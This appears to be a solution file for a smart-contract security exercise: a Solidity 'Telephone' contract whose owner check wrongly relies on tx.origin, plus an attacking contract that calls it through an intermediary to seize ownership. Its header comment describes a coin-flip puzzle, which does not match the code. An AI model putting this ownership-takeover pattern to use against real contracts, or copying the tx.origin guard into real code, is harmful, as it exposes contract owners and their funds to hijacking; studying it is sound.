// Contract tells user whether to flip 1 or 0.
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract CallTelephone {
    Telephone internal telephone;

    constructor(address _telephoneAddress) {
        telephone = Telephone(_telephoneAddress);
    }

    function callTelephone() public {
        telephone.changeOwner(msg.sender);
    }
}